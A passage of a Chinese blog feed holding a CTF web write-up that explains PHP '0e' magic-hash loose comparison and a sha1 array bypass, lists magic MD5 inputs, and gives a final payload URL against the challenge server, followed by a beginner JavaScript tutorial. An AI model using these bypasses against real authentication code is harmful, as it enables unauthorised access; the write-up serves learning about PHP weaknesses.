class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // ========== Stage 2 ==========  </span><br><span class="line">    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])&#123; </span><br><span class="line">        print &apos;Your password can not be your name.&apos;; </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line">    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))&#123; </span><br><span class="line">        print &apos;You passed stage 2.&lt;br /&gt;&apos;; </span><br><span class="line">        print &apos;Flag: &apos;.$flag; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        print &apos;Invalid password&apos;; </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="1-stage-1-分析"><a href="#1-stage-1-分析" class="headerlink" title="1.stage 1 分析"></a><font color="navy">1.stage 1 分析</font></h4><blockquote><p>如上面的代码所示，需要输入三个参数：name、password 和 test，对 stage 1 代码分析：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$test=$_GET[<span class="string">'test'</span>];  </span><br><span class="line">$test=md5($test);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($test == <span class="string">'0'</span>) &#123;  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'You passed stage 1.&lt;br /&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Game over at stage 1."</span>;  </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对输入的 test 值进行 md5 加密，使得加密后的结果等于 0 ，这样就可以通过 stage 1，那么我们在解题时需要做的就是如何使得 test 加密后的结果等于 0 呢？</p></blockquote><h4 id="2-stage-2-分析"><a href="#2-stage-2-分析" class="headerlink" title="2.stage 2 分析"></a><font color="navy">2.stage 2 分析</font></h4><blockquote><p>在分析了 stage 1 后，我们再继续对 stage 2 的代码进行分析：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>; </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'You passed stage 2.&lt;br /&gt;'</span>; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Flag: '</span>.$flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Invalid password'</span>; </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先要使得输入的 name 和 password 的值不相等，然后将输入的 name 和 password 对应的值分别进行 sha1 进行加密 ，使得加密后的结果是“<strong>同类型同值</strong>”的。在分析了 stage 2 后，我们后面需要做的工作有两个：</p><ul><li>分别找到一个 name 和 password 的值，这两个值不能相等，并对这两个进行 md5 加密，使得结果是同类型同值的 ；</li></ul><p>如果上述的方法不能实现，那么我们再根据 PHP 的漏洞进行攻击。</p></blockquote><h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="brown">三、解题步骤</font></h3><h4 id="1-找出-test-的值"><a href="#1-找出-test-的值" class="headerlink" title="1.找出 test 的值"></a><font color="navy">1.找出 test 的值</font></h4><blockquote><p>在 BabyXSS 题目中，我们曾经写过一个是关于求通过输入数据，数据经过 md5 加密并匹配给定的字符串的脚本，那么我们将那个程序直接拿过来用，把给定的字符串替换为 0 ，我们尝试求一下解，果然我们得到了一个数值：27，但是将 test = 27 放到 URL 中，结果是错误的。</p><p><br></p><p>那么我们再换个思维去思考这个问题，在 PHP 漏洞的总结中可以知道，<code>PHP在处理哈希字符串时，会利用 ”!=” 或 ”==” 来对哈希值进行比较，它把每一个以 “0E” 开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，那么PHP将会认为它们都是 0。</code>那么我们只需要找到加密后的结果是以 <strong>0E</strong> 开头的原文就可以了，那么经过尝试我们得出以下几个原文和密文：</p><ul><li>QNKCDZO ——&gt; 0e830400451993494058024219903391</li><li>PJNPDWY ——&gt; 0e291529052894702774557631701704</li><li>NWWKITQ ——&gt; 0e763082070976038347657360817689</li><li>NOOPCJF ——&gt; 0e818888003657176127862245791911</li><li>MMHUWUV ——&gt; 0e701732711630150438129209816536</li><li>MAUXXQC ——&gt; 0e478478466848439040434801845361</li><li>IHKFRNS ——&gt; 0e256160682445802696926137988570</li><li>GZECLQZ ——&gt; 0e537612333747236407713628225676</li></ul><p>我们只需要选择其中的一个就可以，在这里我们选择 “<strong>QNKCDZO</strong>” 进行尝试得到下图的结果：</p><p><img src="/images/1564657630.jpg" alt></p></blockquote><h4 id="2-求-name-和-password"><a href="#2-求-name-和-password" class="headerlink" title="2.求 name 和 password"></a><font color="navy">2.求 name 和 password</font></h4><blockquote><p>下面我们要求 name 和 password 的值了，在这里需要提的一个就是 sha1 碰撞，通过这种碰撞是可以找出两个数的 sha1 值相等的，但是花的时间和精力就相对大些，那我们是不是也可以通过 PHP 的漏洞，绕过 sha1 使得满足 if 条件呢？</p><p><br></p><p>答案是肯定的，在 PHP 漏洞总结中，我们有一个是关于 sha1 的，<code>sha1([]) 和 md5([]) 处理数组不会报错，直接返回false</code>，那么我们可以通过使 name 和 password 为数组类型，sha1 对数组处理后返回 null 绕过 “===” 。</p><p><br>现在我们使 <font color="red"><strong>name[]=0&amp;password[]=2</strong></font>，这个时候能够成功的满足<code>if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])</code>不相等，在<code>else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))</code>的条件中，sha1 对 name 和 password 的数组类型无法理解都返回 <code>null</code>，也就使得 null === null ，所以也就满足第二个条件。</p></blockquote><h4 id="3-提交构造的-payload，获取-flag"><a href="#3-提交构造的-payload，获取-flag" class="headerlink" title="3.提交构造的 payload，获取 flag"></a><font color="navy">3.提交构造的 payload，获取 flag</font></h4><blockquote><p>经过以上两步的分析，我们可以得到三个参数的值，那么下面我们构造一下 payload ：</p><p><center><font color="red">http://123.207.149.64:23331/feature/?test=QNKCDZO&password[]=2&name[]=0</font></center><br>我们可以从服务器得到 flag：</p><p><img src="/images/1564661617(1" alt>.png)</p></blockquote><p><img src="https://www.canva.cn/learn/wp-content/uploads/sites/17/2019/07/%E5%BB%BA%E5%86%9B%E8%8A%82%E7%BA%AA%E5%BF%B5%E6%97%A5%E2%94%82%E4%B8%BA%E5%86%9B%E5%93%A5%E5%93%A5%E6%89%93call%E7%9A%84%E7%AC%AC92%E5%B9%B422.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、PHP-部分漏洞&quot;&gt;&lt;a href=&quot;#一、PHP-部分漏洞&quot; class=&quot;headerlink&quot; title=&quot;一、PHP 部分漏洞&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、PHP 部分漏洞&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-GET-
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 学习笔记（一）</title>
    <link href="https://muzibing.github.io/2019/07/31/2019.07.31%EF%BC%8877%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/31/2019.07.31（77）/</id>
    <published>2019-07-30T16:00:00.000Z</published>
    <updated>2019-07-31T11:47:41.983Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、JS-简介"><a href="#一、JS-简介" class="headerlink" title="一、JS 简介"></a><font color="brown">一、JS 简介</font></h3><blockquote><p>getElementById() 是多个 JavaScript HTML 方法之一</p><ol><li><p><strong>JavaScript 能够改变 HTML 的内容</strong>：</p><font color="navy">document.getElementById("demo").innerHTML = "Hello JavaScript";</font></li><li><p><strong>JavaScript 能够改变 HTML 属性</strong>：</p><font color="navy">document.getElementById("demo").src =</font></li><li><p><strong>JavaScript 能够改变 HTML 样式 (CSS)</strong>:</p><font color="navy">document.getElementById("demo").style.fontSize=""</font></li><li><p><strong>JavaScript 能够隐藏 HTML元素</strong>:</p><font color="navy">document.getElementById("demo").style.display='none'</font></li><li><p><strong>JavaScript 能够显示 HTML 元素</strong>:</p><font color="navy">document.getElementById("demo").style.display="block"</font></li></ol></blockquote><h3 id="二、JS-使用"><a href="#二、JS-使用" class="headerlink" title="二、JS 使用"></a><font color="brown">二、JS 使用</font></h3><blockquote><h4 id="1-标签"><a href="#1-标签" class="headerlink" title="1. \标签"></a><font color="navy">1. \<script>标签</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在 HTML 中，JavaScript 代码必须位于 \<script> 与 \</script> 标签之间.<p></p><h4 id="2-JavaScript-函数和事件"><a href="#2-JavaScript-函数和事件" class="headerlink" title="2.JavaScript 函数和事件"></a><font color="navy">2.JavaScript 函数和事件</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JavaScript 函数是一种 JavaScript 代码块，它可以在调用时被执行。例如，当发生事件时调用函数，比如当用户点击按钮时。</p><h4 id="3-或-中的-JavaScript"><a href="#3-或-中的-JavaScript" class="headerlink" title="3. \ 或 \ 中的 JavaScript"></a><font color="navy">3. \<head><meta name="generator" content="Hexo 3.8.0"> 或 \</head><body> 中的 JavaScript</body></font></h4><ul><!-- hexo-inject:begin --><!-- hexo-inject:end --><li><p>\<head><meta name="generator" content="Hexo 3.8.0">中的 JavaScript<!-- hexo-inject:begin --><!-- hexo-inject:end --></head></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;       <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></font></h4></blockquote><p>&gt;</p><blockquote><ul><li><p>\<body> 中的 JavaScript</body></p><!-- hexo-inject:begin --><!-- hexo-inject:end --><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Web Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Web Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><p>&gt;</p><blockquote><p>  <strong>注意</strong>：把脚本置于 <strong>\<body><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></strong> 元素的底部，可改善显示速度，因为脚本编译会拖慢显示</p><h4 id="4-外部脚本"><a href="#4-外部脚本" class="headerlink" title="4.外部脚本"></a><font color="navy">4.外部脚本</font></h4><ul><li><p>外部文件：myScript.js</p><p>外部脚本很实用，如果相同的脚本被用于许多不同的网页。JavaScript 文件的文件扩展名是 <strong>.js</strong>。如需使用外部脚本，请在\<script> 标签的 src (source) 属性中设置脚本的名称</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"myScript.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h2</span>&gt;</span>外部 JavaScript<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span>&gt;</span>（myFunction 存储在名为 "myScript.js" 的外部文件中。）<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/demo/myScript.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><p>&gt;</p><blockquote><ul><li><p>外部引用的方式</p><ul><li>可通过完整的 URL 或相对于当前网页的路径引用外部脚本：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.w3school.com.cn/js/myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><p>&gt;</p><blockquote><ul><li><p>使用了位于当前网站上指定文件夹中的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/js/myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><p>&gt;</p><blockquote><ul><li><p>链接了与当前页面相同文件夹的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h3 id="三、JS-输出"><a href="#三、JS-输出" class="headerlink" title="三、JS 输出"></a><font color = 'brown'>三、JS 输出</font></h3><blockquote><h4 id="1-JS-显示方案"><a href="#1-JS-显示方案" class="headerlink" title="1. JS 显示方案"></a><font color = 'navy'>1. JS 显示方案</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JavaScript 能够以不同方式“显示”数据：</p><ul><li>使用<code>window.alert()</code>写入警告框</li><li>使用 <code>document.write()</code>写入 HTML 输出</li><li>使用 <code>innerHTML</code> 写入 HTML 元素</li><li>使用 <code>console.log()</code> 写入浏览器控制台</li></ul><h4 id="2-使用-innerHTML"><a href="#2-使用-innerHTML" class="headerlink" title="2.使用 innerHTML"></a><font color = 'navy'>2.使用 innerHTML</font></h4><p><code>document.getElementById(id)</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;id 属性定义 HTML 元素。innerHTML 属性定义 HTML 内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt;  <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="number">5</span> + <span class="number">6</span>;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color = 'red'><strong>提示</strong></font>：更改HTML 元素的 innerHTML 属性是在 HTML 中显示数据的常用方法。</p><h4 id="3-使用-document-write"><a href="#3-使用-document-write" class="headerlink" title="3.使用 document.write()"></a><font color = 'navy'>3.使用 document.write()</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>出于测试目的，使用 <code>document.write()</code> 比较方便.</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"document.write(5 + 6)"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>注意：</strong>在HTML 文档完全加载后使用 <code>document.write()</code>将<strong>删除所有已有的</strong> <strong>HTML</strong>，<strong>document.write()</strong> 方法仅用于测试。</p><h4 id="4-使用-window-alert"><a href="#4-使用-window-alert" class="headerlink" title="4.使用 window.alert()"></a><font color = 'navy'>4.使用 window.alert()</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>能够使用警告框来显示数据</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">window</span>.alert(<span class="number">5</span> + <span class="number">6</span>);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><h4 id="5-使用-console-log"><a href="#5-使用-console-log" class="headerlink" title="5.使用 console.log()"></a><font color = 'navy'>5.使用 console.log()</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在浏览器中，您可使用 console.log() 方法来显示数据。可以通过 F12 来激活浏览器控制台，并在菜单中选择“控制台”。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span 